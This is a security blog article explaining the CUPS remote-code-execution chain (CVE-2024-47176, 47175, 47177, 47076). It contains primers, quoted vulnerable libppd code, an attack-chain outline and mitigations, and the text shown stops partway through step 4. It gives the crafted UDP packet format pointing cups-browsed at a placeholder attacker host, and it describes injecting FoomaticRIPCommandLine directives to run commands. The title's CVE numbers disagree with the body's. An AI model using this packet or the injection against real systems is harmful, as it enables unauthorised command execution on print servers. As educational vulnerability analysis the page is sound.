<!DOCTYPE html>
<html lang="en-us">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    
    <meta name="generator" content="Hugo 0.136.5">

    <script src="js/custom.js"></script>
    

    

    
        
            <meta
                name="description"
                content="Bones &amp; All Cyber Security" />
        

        
            <meta
                name="keywords"
                content="hacking, AD, hack the box, HTB, security, pentesting, cybersecurity, pentester, active-directory" />
        

        
            <meta name="author" content="bloodstiller" />
        

    


    <title>
        
            Understanding the CUPS Exploit Chain: A Deep Dive into CVE-2024-4176, CVE-2024-4175, CVE-2024-4177 and CVE-2024-4076 |
            Hack the planet
        
    </title>

    


    
    

    
    


    
    


    
    


    
    

    


    
    

    

    

        
            
            <link
                rel="stylesheet"
                href="/reset.min_6107201571472815285.3662e40c85350bf0bcf308b7db81c173e4b690b862d3c3cde460de5155550bf055b7ff48cddb1cf5255e55f0355196d8dec1d49434b2457842cc77ebea198f3f.css"
                integrity="sha512-NmLkDIU1C/C88wi324HBc&#43;S2kLhi08PN5GDeUVVVC/BVt/9Izdsc9SVeVfA1UZbY3sHUlDSyRXhCzHfr6hmPPw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/01_layout.5974c097ff194e0a64d31c28fc478cc38b6290fe28d2cc2dbf5ae52a66751db74e4e7374bc4e25f464ea679f74cd86c474a5367e05c2db34a1b9b273466691e0.css"
                integrity="sha512-WXTAl/8ZTgpk0xwo/EeMw4tikP4o0swtv1rlKmZ1HbdOTnN0vE4l9GTqZ590zYbEdKU2fgXC2zShubJzRmaR4A==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/02_style.8484c853cc558c1c2189842f955ad4be9bf66854698f03f140aef3cfc23174c78eb1ab05b915b7877afac7464e5d70d467c87c1fb3fcbe11a75d379de01e0798.css"
                integrity="sha512-hITIU8xVjBwhiYQvlVrUvpv2aFRpjwPxQK7zz8IxdMeOsasFuRW3h3r6x0ZOXXDUZ8h8H7P8vhGnXTed4B4HmA==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/03_home.6d64455a82e28b01e58f3c37541add9e36fc8ed87562dac91ff06da3f7f11b32ac1cacaa593b2ab2e01acd894659f66c249bd0a261f051038f19a8734c3e1243.css"
                integrity="sha512-bWRFWoLiiwHljzw3VBrdnjb8jth1YtrJH/Bto/fxGzKsHKyqWTsqsuAazYlGWfZsJJvQomHwUQOPGahzTD4SQw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/04_responsive.065451199c1e1cd4f86ac1c8733e3c77eaf215b4972cefff7e7929a2837f5b2cc0e0a04f99f34d58e082812d6102c8cc9b358d21db784e9c4d5e5a8c79f4bc43.css"
                integrity="sha512-BlRRGZweHNT4asHIcz48d&#43;ryFbSXLO//fnkpooN/WyzA4KBPmfNNWOCCgS1hAsjMmzWNIdt4TpxNXlqMefS8Qw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/05_markdown.9afaac6b0a75a2cd9086fb9684dfae53bd04b90e034a252e123a9822c3fa6a5c8a3f88211159b1bd0c6918d19ed7bf3e929ff12de51d06fab0eea77e2374f967.css"
                integrity="sha512-mvqsawp1os2QhvuWhN&#43;uU70EuQ4DSiUuEjqYIsP6alyKP4ghEVmxvQxpGNGe178&#43;kp/xLeUdBvqw7qd&#43;I3T5Zw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/06_image.ee39fc51345f4c74b8c491bde29d5b2053688d0cc6e937f5660e0f5e3665212473f4cb408cd1749317343308aa41ef1baca3ec3f3aff986ab3764c822790008f.css"
                integrity="sha512-7jn8UTRfTHS4xJG94p1bIFNojQzG6Tf1Zg4PXjZlISRz9MtAjNF0kxc0MwiqQe8brKPsPzr/mGqzdkyCJ5AAjw==" />
        

    


    
    

    

    

    

    


</head>



    <body>
        <header class="header">
    <div class="header_left">
        
    </div>

    <div class="header_middle">
        
            Understanding the CUPS Exploit Chain: A Deep Dive into CVE-2024-4176, CVE-2024-4175, CVE-2024-4177 and CVE-2024-4076 -
            Hack the planet
        
    </div>
</header>



        <main>
            <aside class="sidebar">
    



    
    

    
    


    <ul class="section-tree">
        
            
                <li
                    
                        class="dir opened-dir"
                    >
                    <span class="dir-text"> Articles </span>

                    



    
    

    
    


    <ul class="section-tree">
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/understandingthemebleedcve-2023-38146/" title="./articles/understandingthemebleedcve-2023-38146/">
                        
                            Understanding CVE-2023-38146: Deep Dive into the ThemeBleed Vulnerability
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/understandingcupsexploitation/" title="./articles/understandingcupsexploitation/">
                        
                            Understanding the CUPS Exploit Chain: A Deep Dive into CVE-2024-4176, CVE-2024-4175, CVE-2024-4177 and CVE-2024-4076
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/understandingnopacexploit/" title="./articles/understandingnopacexploit/">
                        
                            Understanding the NoPac Exploit: A Deep Dive into CVE-2021-42278 and CVE-2021-42287
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/seloaddriverprivilegeescalation/" title="./articles/seloaddriverprivilegeescalation/">
                        
                            Understanding SeLoadDriverPrivilege Escalation: A Deep Dive
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/azureadconnectattack/" title="./articles/azureadconnectattack/">
                        
                            Understanding Azure AD Connect Exploitation &amp; Privilege Escalation
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/shadowcredentialsattack/" title="./articles/shadowcredentialsattack/">
                        
                            Understanding the Shadow Credentials Attack Vector
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/deserializationattacksexplained/" title="./articles/deserializationattacksexplained/">
                        
                            Understanding .NET Deserialization Exploits: A Deep Dive
                        
                    </a>
                </li>
            
        
    </ul>


                </li>
            
        
            
                <li
                    
                        class="dir closed-dir"
                    >
                    <span class="dir-text"> Walkthroughs </span>

                    



    
    

    
    


    <ul class="section-tree">
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/sauna-box/" title="./walkthroughs/sauna-box/">
                        
                            Sauna HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/active-box/" title="./walkthroughs/active-box/">
                        
                            Active HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/cicada-box/" title="./walkthroughs/cicada-box/">
                        
                            Cicada HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/authority-box/" title="./walkthroughs/authority-box/">
                        
                            Authority HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/evilcups-box/" title="./walkthroughs/evilcups-box/">
                        
                            EvilCUPS HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/resolute-box/" title="./walkthroughs/resolute-box/">
                        
                            Resolute HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/fuse-box/" title="./walkthroughs/fuse-box/">
                        
                            Fuse HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/cascade-box/" title="./walkthroughs/cascade-box/">
                        
                            Cascade HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/monteverde-box/" title="./walkthroughs/monteverde-box/">
                        
                            Monteverde HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/outdated-box/" title="./walkthroughs/outdated-box/">
                        
                            Outdated HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/scrambled-box/" title="./walkthroughs/scrambled-box/">
                        
                            Scrambled HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/escape-box/" title="./walkthroughs/escape-box/">
                        
                            Escape HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/hospital-box/" title="./walkthroughs/hospital-box/">
                        
                            Hospital HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/intelligence-box/" title="./walkthroughs/intelligence-box/">
                        
                            Intelligence HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/manager-box/" title="./walkthroughs/manager-box/">
                        
                            Manager HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/access-box/" title="./walkthroughs/access-box/">
                        
                            Access HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/remote-box/" title="./walkthroughs/remote-box/">
                        
                            Remote HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/support-box/" title="./walkthroughs/support-box/">
                        
                            Support HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/return-box/" title="./walkthroughs/return-box/">
                        
                            Return HTB Walkthrough
                        
                    </a>
                </li>
            
        
    </ul>


                </li>
            
        
            
                <li
                    
                        class="dir closed-dir"
                    >
                    <span class="dir-text"> Tools </span>

                    



    
    

    
    


    <ul class="section-tree">
        
            
                <li class="file">
                    <a href="http://localhost:1313/tools/automatingqemukalivm/" title="./tools/automatingqemukalivm/">
                        
                            Automating Kali VM Setup with QEMU
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/tools/bloodserver/" title="./tools/bloodserver/">
                        
                            BloodServer: A Secure File Transfer Tool for Penetration Testers
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/tools/ldapire/" title="./tools/ldapire/">
                        
                            LDAPire: LDAP Enumeration Tool
                        
                    </a>
                </li>
            
        
    </ul>


                </li>
            
        
            
                <li
                    
                        class="dir closed-dir"
                    >
                    <span class="dir-text"> Cheatsheets </span>

                    



    
    

    
    


    <ul class="section-tree">
        
            
                <li class="file">
                    <a href="http://localhost:1313/cheatsheets/ldap-cheatsheet/" title="./cheatsheets/ldap-cheatsheet/">
                        
                            Attacking LDAP: Deep Dive &amp; Cheatsheet
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/cheatsheets/rpc-cheatsheet/" title="./cheatsheets/rpc-cheatsheet/">
                        
                            Attacking RPC: Deep Dive &amp; Cheat Sheet
                        
                    </a>
                </li>
            
        
    </ul>


                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/understanding2023-28252-clfs/" title="./understanding2023-28252-clfs/">
                        
                            Understanding CVE-2023-28252: Deep Dive into the CLFS Privilege Escalation Vulnerability
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/aboutme/" title="./aboutme/">
                        
                            about me
                        
                    </a>
                </li>
            
        
    </ul>


</aside>
<aside class="exapandable"></aside>


            
    <article class="main">
        <button
    class="sidebar-toggle-btn"
    type="menu"
    aria-expanded="false"
    aria-haspopup="true">
    <i class="bi bi-list"></i>
</button>



        <div class="title">
            <h1 class="title-header">
                Understanding the CUPS Exploit Chain: A Deep Dive into CVE-2024-4176, CVE-2024-4175, CVE-2024-4177 and CVE-2024-4076
            </h1>

            <div class="author-date-readtime">
                

                    
                        <div class="author" title="Author">
                            <i class="bi bi-person"></i>
                            <a
                                href="/author/bloodstiller/"
                                class="cat-btn">
                                bloodstiller
                            </a>
                        </div>
                    

                

                
                    <div class="date" title="Date">
                        <i class="bi bi-calendar3"></i>
                        <time
                            datetime="2024.22.10"
                            >2024.22.10
                        </time>
                    </div>
                

                
                    <div
                        class="readtime"
                        title="Time to Read">
                        <i class="bi bi-clock"></i>
                        8 mins to read
                    </div>
                
            </div>
        </div>

        <div class="article-meta">
            

            
                <div class="tags">
                    <i
                        class="bi bi-tags"
                        title="Tags"></i>
                    
                        <a
                            href="/tags/cve-2024-4176/"
                            class="tag-btn">
                            CVE-2024-4176
                        </a>
                    
                        <a
                            href="/tags/cve-2024-4175/"
                            class="tag-btn">
                            CVE-2024-4175
                        </a>
                    
                        <a
                            href="/tags/cve-2024-4177/"
                            class="tag-btn">
                            CVE-2024-4177
                        </a>
                    
                        <a
                            href="/tags/cve-2024-4076/"
                            class="tag-btn">
                            CVE-2024-4076
                        </a>
                    
                        <a
                            href="/tags/linux/"
                            class="tag-btn">
                            Linux
                        </a>
                    
                        <a
                            href="/tags/cups/"
                            class="tag-btn">
                            CUPS
                        </a>
                    
                </div>
            

            
                <div class="breadcumb">
                    <i class="bi bi-folder"></i>
                    
    
    




<a href="http://localhost:1313/" class="bread-btn">
    
        <i class="bi bi-house-fill"></i>
    

    
        Home
    
</a>




    /



<a href="http://localhost:1313/articles/" class="bread-btn">
    

    
        Articles
    
</a>




    /



<a href="http://localhost:1313/articles/understandingcupsexploitation/" class="bread-btn">
    

    
        
            Understanding the CUPS Exploit Chain: A Deep Dive into CVE-2024-4176, CVE-2024-4175, CVE-2024-4177 and CVE-2024-4076
        

    
</a>

                </div>
            

            
        </div>

        
            <nav id="TableOfContents">
  <ul>
    <li><a href="#introduction">Introduction</a></li>
    <li><a href="#cups-ipp-and-ppd-a-primer">CUPS, IPP &amp; PPD: A Primer</a>
      <ul>
        <li><a href="#common-unix-printing-system--cups--primer">Common UNIX Printing System (CUPS) Primer:</a></li>
        <li><a href="#internet-printing-protocol--ipp--primer">Internet Printing Protocol (IPP) Primer:</a></li>
        <li><a href="#postscript-printer-description--ppd--primer">PostScript Printer Description (PPD) Primer:</a></li>
      </ul>
    </li>
    <li><a href="#the-vulnerabilities">The Vulnerabilities</a>
      <ul>
        <li><a href="#cve-2024-47176-malicious-packet-exploitation">CVE-2024-47176: Malicious Packet Exploitation:</a></li>
        <li><a href="#cve-2024-47175-fake-printer-addition">CVE-2024-47175: Fake Printer Addition:</a></li>
        <li><a href="#cve-2024-47177-foomatic-rip-filter-exploitation">CVE-2024-47177: Foomatic-RIP Filter Exploitation:</a></li>
        <li><a href="#cve-2024-47076-exploiting-ppd-instructions-and-filters">CVE-2024-47076: Exploiting PPD Instructions and Filters:</a></li>
      </ul>
    </li>
    <li><a href="#attack-process-deep-dive">Attack Process Deep Dive:</a>
      <ul>
        <li><a href="#attack-chain-summarized">Attack Chain Summarized:</a></li>
        <li><a href="#detailed-exploitation-process">Detailed Exploitation Process:</a></li>
      </ul>
    </li>
    <li><a href="#example-of-exploitation-dot">Example of Exploitation.</a>
      <ul>
        <li><a href="#preparing-the-cups-exploit">Preparing the CUPS Exploit:</a></li>
        <li><a href="#running-the-cups-exploit">Running the CUPS Exploit:</a></li>
      </ul>
    </li>
    <li><a href="#conclusion">Conclusion</a></li>
    <li><a href="#references">References</a></li>
  </ul>
</nav>
        


        <div class="content">
            
                <h2 id="introduction">Introduction</h2>
<p>The Common UNIX Printing System (CUPS) is a crucial component in many Unix-like operating systems, including Linux and macOS. Recent discoveries have revealed significant vulnerabilities in CUPS, potentially exposing systems to serious security risks. This post will explore these vulnerabilities and demonstrate how they can be exploited.</p>
<h2 id="cups-ipp-and-ppd-a-primer">CUPS, IPP &amp; PPD: A Primer</h2>
<h3 id="common-unix-printing-system--cups--primer">Common UNIX Printing System (CUPS) Primer:</h3>
<ul>
<li>
<p><strong>What is CUPS?</strong>:</p>
<ul>
<li>CUPS (Common UNIX Printing System) is an open-source printing system developed by Apple for macOS, Linux, and other UNIX-like operating systems.</li>
<li>It allows a computer to act as a print server, enabling clients to send print jobs to printers using Internet Printing Protocol (IPP) and other protocols.</li>
<li>Supports printing to both local and network printers, handling print queues and printer management.</li>
</ul>
</li>
<li>
<p><strong>Key Features of CUPS</strong>:</p>
<ul>
<li><strong>Print Server Functionality</strong>:
<ul>
<li>Manages printers and print jobs on both local machines and networked environments.</li>
</ul>
</li>
<li><strong>Protocol Support</strong>:
<ul>
<li>Uses IPP as its core protocol but also supports older protocols such as Line Printer Daemon (LPD), Server Message Block (SMB), and more.</li>
</ul>
</li>
<li><strong>Driver Flexibility</strong>:
<ul>
<li>Allows the use of a variety of printer drivers, supporting a wide range of printers.</li>
</ul>
</li>
<li><strong>Web Interface</strong>:
<ul>
<li>Provides a web-based interface for configuring printers, managing jobs, and accessing logs.</li>
</ul>
</li>
<li><strong>Authentication and Security</strong>:
<ul>
<li>Supports various authentication methods (e.g., Basic, Digest, Kerberos) and encrypts connections using TLS to ensure secure printing.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="internet-printing-protocol--ipp--primer">Internet Printing Protocol (IPP) Primer:</h3>
<ul>
<li>
<p><strong>Definition</strong>:</p>
<ul>
<li>IPP is a network protocol used for communication between client devices and printers (or print servers). It allows for the submission, management, and control of print jobs over a network.</li>
<li>It is the core protocol used by CUPS and other modern printing systems for handling print tasks.</li>
</ul>
</li>
<li>
<p><strong>Key Features of IPP</strong>:</p>
<ul>
<li><strong>Printing Control</strong>:
<ul>
<li>IPP enables clients to send print jobs to printers, cancel jobs, check the status of printers and jobs, and retrieve printer capabilities.</li>
</ul>
</li>
<li><strong>Standardization</strong>:
<ul>
<li>Defined by the Internet Engineering Task Force (IETF), IPP is a well-documented, standardized protocol.</li>
</ul>
</li>
<li><strong>Support for Secure Transmission</strong>:
<ul>
<li>IPP can use HTTP over SSL (HTTPS) to ensure secure, encrypted communication between client and server.</li>
</ul>
</li>
<li><strong>Advanced Printer Features</strong>:
<ul>
<li>Supports a wide range of printing features, such as duplex printing, media selection, and finishing options.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="postscript-printer-description--ppd--primer">PostScript Printer Description (PPD) Primer:</h3>
<ul>
<li>
<p><strong>What is a PPD File?</strong></p>
<ul>
<li>A PostScript Printer Description (PPD) file is a configuration file used by printing systems to describe the capabilities and features of a PostScript printer.</li>
<li>PPD files provide detailed information about the printer&rsquo;s features, such as supported paper sizes, resolution, duplexing, and more.</li>
<li>A PPD contains the PostScript commands (code) which is used to invoke features for the print job handled by that printer.</li>
</ul>
</li>
<li>
<p><strong>Purpose of a PPD File</strong>:</p>
<ul>
<li><strong>Printer Configuration</strong>:
<ul>
<li>PPD files allow the operating system and printing system (e.g., CUPS) to configure the printer correctly.</li>
</ul>
</li>
<li><strong>Feature Customization</strong>:
<ul>
<li>They describe optional features like trays, memory, or color modes, enabling users to select these features during printing.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Structure of a PPD File</strong>:</p>
<ul>
<li><strong>Header</strong>:
<ul>
<li>Contains general information about the printer, such as its model name, manufacturer, and supported languages.</li>
</ul>
</li>
<li><strong>Printer Capabilities</strong>:
<ul>
<li>Details the specific print features like:
<ul>
<li>Supported page sizes (e.g., A4, Letter)</li>
<li>Print resolution (e.g., 600 DPI, 1200 DPI)</li>
<li>Duplex printing capabilities (automatic double-sided printing)</li>
</ul>
</li>
</ul>
</li>
<li><strong>Option Keywords</strong>:
<ul>
<li>Defines selectable options for users, such as media types, color modes, or finishing options like stapling or punching.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>How a PPD File Works</strong>:</p>
<ul>
<li>When a print job is initiated, the PPD file helps the system translate the print request into a format the printer can understand.</li>
<li>It provides the necessary instructions for the printer driver to produce the correct output by interpreting the selected options (resolution, paper size, etc.).</li>
</ul>
</li>
<li>
<p><strong>Common Use Cases</strong>:</p>
<ul>
<li><strong>PostScript Printers</strong>:
<ul>
<li>Primarily used for configuring PostScript printers, but they can also be used by CUPS to manage non-PostScript printers by mapping specific print features.</li>
</ul>
</li>
<li><strong>Driver Customization</strong>:
<ul>
<li>Often included with printer drivers or downloaded from the printer manufacturer’s website, ensuring that all printer features are available to the user.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Security and Maintenance</strong>:</p>
<ul>
<li><strong>Misconfiguration Issues</strong>:
<ul>
<li>Incorrect or outdated PPD files may lead to misconfiguration of print jobs, causing print failures or reduced functionality.</li>
</ul>
</li>
<li><strong>Modifications</strong>:
<ul>
<li>PPD files can be edited manually to customize printer behavior, though improper editing may lead to errors or printing issues.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="the-vulnerabilities">The Vulnerabilities</h2>
<ul>
<li>All discovered by <a href="https://www.evilsocket.net/">evil-socket</a></li>
</ul>
<h3 id="cve-2024-47176-malicious-packet-exploitation">CVE-2024-47176: Malicious Packet Exploitation:</h3>
<ul>
<li>Affects the <code>cups-browsed</code> component</li>
<li>If a packet containing a URL in the form <code>0 3 http://&lt;ATTACKER-IP&gt;:&lt;PORT&gt;/printers/Name</code> is sent to UDP port 631 on a vulnerable system, it results in <code>cups-browsed</code> connecting back to that malicious URL and sending back the kernel version and architecture of the vulnerable system.</li>
</ul>
<h3 id="cve-2024-47175-fake-printer-addition">CVE-2024-47175: Fake Printer Addition:</h3>
<ul>
<li>Vulnerability in <code>libppd</code></li>
<li>Allows an attacker to add a fake printer to the CUPS service</li>
<li>Stems from improper handling of untrusted input in PPD (PostScript Printer Description) file creation</li>
</ul>
<h3 id="cve-2024-47177-foomatic-rip-filter-exploitation">CVE-2024-47177: Foomatic-RIP Filter Exploitation:</h3>
<ul>
<li>The Foomatic-RIP filter is an older filter with a history of being exploitable</li>
<li>It accepts the <code>FoomaticRIPCommandLine</code> directive in the PPD, which allows any command to be executed</li>
<li>Vulnerability persists due to backward compatibility issues with older printers</li>
</ul>
<h3 id="cve-2024-47076-exploiting-ppd-instructions-and-filters">CVE-2024-47076: Exploiting PPD Instructions and Filters:</h3>
<ul>
<li>Vulnerability in <code>libcupsfilters</code></li>
<li>PPD files configure how CUPS handles printing tasks, including specifying filters</li>
</ul>
<h2 id="attack-process-deep-dive">Attack Process Deep Dive:</h2>
<h3 id="attack-chain-summarized">Attack Chain Summarized:</h3>
<ol>
<li>Force the target machine to connect back to our malicious <code>IPP</code> server by sending a crafted packet to port <code>631</code> thereby starting the process of creating a fake printer.</li>
<li>Return a malicious <code>IPP</code> attribute string to inject our controlled <code>PPD</code> directives to the temporary file.</li>
<li>Either print a test page from our fake printer if we have access to the <code>CUPS</code> web panel to trigger the <code>PPD</code> directives (and our commands) to be executed or wait for a print job to be sent to the fake printer.</li>
</ol>
<h3 id="detailed-exploitation-process">Detailed Exploitation Process:</h3>
<h4 id="step-1-getting-the-printer-to-connect-back--cve-2024-47176">Step 1: Getting the printer to connect back (CVE-2024-47176):</h4>
<ul>
<li>Vulnerability in <code>cups-browsed</code> component</li>
<li>Exploit method:
<ul>
<li>Send a packet containing a URL in the form: <code>0 3 http://&lt;ATTACKER-IP&gt;:&lt;PORT&gt;/printers/Name</code></li>
<li>Target: UDP port <code>631</code> on the vulnerable system</li>
</ul>
</li>
<li>Result: <code>cups-browsed</code> connects back to the malicious URL, revealing:
<ul>
<li>Kernel version</li>
<li>System architecture</li>
</ul>
</li>
</ul>
<h4 id="step-2-adding-the-fake-printer--cve-2024-47175">Step 2: Adding the Fake Printer (CVE-2024-47175):</h4>
<ul>
<li>Vulnerability in <code>libppd</code></li>
<li>Process:
<ol>
<li>The malicious URL is mistaken for a legitimate printer</li>
<li>CUPS sends a <code>Get-Printer-Attributes</code> request for vendor, model, etc.</li>
<li>Attacker can manipulate this information to add a fake printer to CUPS</li>
<li>New printer addition doesn&rsquo;t notify the user by default</li>
</ol>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>PPD File Creation and Conversion:</p>
<ul>
<li>Returned data is stored in a temporary PPD file</li>
<li>The file is converted using <code>libppd</code> without proper sanitization</li>
<li>Vulnerable code snippet:







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="%20%20//%20Vulnerable%20Code%0a%20%20cupsFilePrintf%28fp,%20%22*Manufacturer:%20%5c%22%25s%5c%22%5cn%22,%20make%29;%0a%20%20//%20Vulnerable%0a%20%20cupsFilePrintf%28fp,%20%22*ModelName:%20%5c%22%25s%20%25s%5c%22%5cn%22,%20make,%20model%29;%0a%20%20//%20Vulnerable%0a%20%20cupsFilePrintf%28fp,%20%22*Product:%20%5c%22%28%25s%20%25s%29%5c%22%5cn%22,%20make,%20model%29;%0a%20%20cupsFilePrintf%28fp,%20%22*NickName:%20%5c%22%25s%20%25s,%20%25sdriverless,%20%25s%5c%22%5cn%22,%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20make,%20model,%20%28is_fax%20?%20%22Fax,%20%22%20:%20%22%22%29,%20VERSION%29;%0a%20%20//%20Vulnerable%0a%20%20cupsFilePrintf%28fp,%20%22*ShortNickName:%20%5c%22%25s%20%25s%5c%22%5cn%22,%20make,%20model%29;">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#75715e">// Vulnerable Code
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">cupsFilePrintf</span>(fp, <span style="color:#e6db74">&#34;*Manufacturer: </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\&#34;\n</span><span style="color:#e6db74">&#34;</span>, make);
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Vulnerable
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">cupsFilePrintf</span>(fp, <span style="color:#e6db74">&#34;*ModelName: </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">%s %s</span><span style="color:#ae81ff">\&#34;\n</span><span style="color:#e6db74">&#34;</span>, make, model);
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Vulnerable
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">cupsFilePrintf</span>(fp, <span style="color:#e6db74">&#34;*Product: </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">(%s %s)</span><span style="color:#ae81ff">\&#34;\n</span><span style="color:#e6db74">&#34;</span>, make, model);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">cupsFilePrintf</span>(fp, <span style="color:#e6db74">&#34;*NickName: </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">%s %s, %sdriverless, %s</span><span style="color:#ae81ff">\&#34;\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>                                     make, model, (is_fax <span style="color:#f92672">?</span> <span style="color:#e6db74">&#34;Fax, &#34;</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span>), VERSION);
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Vulnerable
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">cupsFilePrintf</span>(fp, <span style="color:#e6db74">&#34;*ShortNickName: </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">%s %s</span><span style="color:#ae81ff">\&#34;\n</span><span style="color:#e6db74">&#34;</span>, make, model);</span></span></code></pre></div>
    
</div>
</li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Untrusted Input (Format String Vulnerability):</p>
<ul>
<li><code>cupsFilePrintf</code> used without proper input validation</li>
<li>Attacker can inject format specifiers (e.g., <code>%n</code>, <code>%s</code>) via <code>make</code>, <code>model</code>, or <code>is_fax</code> variables</li>
<li>Potential impacts:
<ul>
<li>Memory address leaks</li>
<li>Memory corruption (buffer overflows, remote code execution)</li>
</ul>
</li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Attack Mechanism:</p>
<ul>
<li>Attacker provides crafted input with format string specifiers (e.g., <code>%x</code>, <code>%n</code>)</li>
<li>If interpreted, can read unintended data or overwrite critical variables in memory</li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Mitigation Steps:</p>
<ul>
<li>Use safer functions like <code>snprintf</code> to limit input size</li>
<li>Sanitize user-controlled input</li>
<li>Explicitly define format specifiers</li>
<li>Validate all user inputs before processing</li>
</ul>
</li>
</ul>
<h4 id="step-3-exploiting-ppd-instructions-and-filters--cve-2024-47076">Step 3: Exploiting PPD Instructions and Filters (CVE-2024-47076):</h4>
<ul>
<li>Vulnerability in <code>libcupsfilters</code></li>
<li>PPD files configure how CUPS handles printing tasks, including specifying filters</li>
<li><code>cupsFilter2</code> Directive:
<ol>
<li>Tells CUPS which filter to run based on print job format and printer capabilities</li>
<li>If manipulated, can alter which filter is executed, potentially running malicious code</li>
</ol>
</li>
</ul>
<h4 id="step-4-exploiting-the-foomatic-rip-filter--cve-2024-47177">Step 4: Exploiting the Foomatic-RIP Filter (CVE-2024-47177):</h4>
<ul>
<li><code>Foomatic-RIP</code> is an older filter with a history of exploitability</li>
<li>Accepts <code>FoomaticRIPCommandLine</code> directive in PPD, allowing arbitrary command execution</li>
<li><code>Foomatic-RIP</code> is a universal converter for various document formats</li>
